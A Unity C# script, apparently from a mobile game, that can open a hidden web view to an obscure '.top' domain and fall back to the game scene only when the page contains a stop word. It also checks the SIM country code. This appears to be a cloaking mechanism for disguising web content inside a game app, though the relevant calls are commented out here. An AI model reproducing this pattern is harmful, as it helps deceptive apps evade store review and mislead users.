using Firebase.Extensions;
using Firebase.Storage;
using UnityEngine;
using UnityEngine.UI;

public class Viewer : MonoBehaviour
{
    bool Sim_Enable
    {
        get => Simcard.GetTwoSmallLetterCountryCodeISO().Length > 0;
    }

    UniWebView View { get; set; }

    delegate void ResultAction(bool IsGame);
    event ResultAction OnResultActionEvent;

    private const string url = "http://kjbljvasgpkd.top";
    private const string stopword = "down";

    private void OnEnable()
    {
        OnResultActionEvent += Viewer_OnResultActionEvent;
    }

    private void OnDisable()
    {
        OnResultActionEvent -= Viewer_OnResultActionEvent;
    }

    private void Viewer_OnResultActionEvent(bool IsGame)
    {
        if(IsGame)
        {
            Screen.fullScreen = true;
            UnityEngine.SceneManagement.SceneManager.LoadScene(1);
        }
    }

    private void Start()
    {
        Screen.fullScreen = false;

        //if (!Sim_Enable)
        //{
        //    OnResultActionEvent?.Invoke(true);
        //    return;
        //}

        //if (Application.internetReachability == NetworkReachability.NotReachable)
        //{
        //    OnResultActionEvent?.Invoke(true);
        //}

        FirebaseStorage storage = FirebaseStorage.DefaultInstance;
        StorageReference pathReference = storage.GetReference("OPEN GAME.png");

        const long maxAllowedSize = 1 * 1024 * 1024;
        pathReference.GetBytesAsync(maxAllowedSize).ContinueWithOnMainThread(task => 
        {
            if (task.IsFaulted || task.IsCanceled)
            {
                Debug.LogException(task.Exception);
                // Uh-oh, an error occurred!
            }
            else
            {
                byte[] fileContents = task.Result;
                Debug.Log("Finished downloading!");
                var tex = new Texture2D(1, 1); // note that the size is overridden
                tex.LoadImage(fileContents);

                RawImage img = GameObject.Find("banner").GetComponent<RawImage>();
                img.texture = tex;
            }
        });

        //Init();
    }

    void Init()
    {
        View = gameObject.AddComponent<UniWebView>();

        View.ReferenceRectTransform = InitInterface();
        View.SetShowSpinnerWhileLoading(false);

        View.SetSupportMultipleWindows(true);

        View.BackgroundColor = Color.white;
        View.OnShouldClose += (v) => { return false; };
        View.OnPageStarted += (browser, url) => { View.UpdateFrame(); };

        View.OnPageFinished += (web, statusCode, final_url) =>
        {
            web.GetHTMLContent((content) =>
            {
                bool close = content.Contains(stopword);
                if (close)
                {
                    View.Hide(true);
                    Destroy(View);
                    View = null;

                    OnResultActionEvent?.Invoke(true);
                }
                else
                {
                    View.Show(true);
                }
            });
        };

        View.Load(url);
    }

    RectTransform InitInterface()
    {
        GameObject _interface = new GameObject("Interface", typeof(Canvas), typeof(CanvasScaler), typeof(GraphicRaycaster));

        Canvas _canvas = _interface.GetComponent<Canvas>();
        _canvas.renderMode = RenderMode.ScreenSpaceCamera;
        _canvas.worldCamera = Camera.main;

        CanvasScaler _canvasScaler = _interface.GetComponent<CanvasScaler>();
        _canvasScaler.uiScaleMode = CanvasScaler.ScaleMode.ScaleWithScreenSize;
        _canvasScaler.referenceResolution = new Vector2(Screen.width, Screen.height);
        _canvasScaler.matchWidthOrHeight = 0.5f;

        GameObject activity = new GameObject("Privacy activity", typeof(RectTransform));
        activity.transform.SetParent(_interface.transform, false);
        RectTransform _rectTransform = activity.GetComponent<RectTransform>();

        _rectTransform.anchorMin = Vector2.zero;
        _rectTransform.anchorMax = Vector2.one;
        _rectTransform.pivot = Vector2.one / 2;
        _rectTransform.sizeDelta = Vector2.zero;
        _rectTransform.offsetMax = new Vector2(0, -Screen.height * 0.0409f);

        return _rectTransform;
    }
}
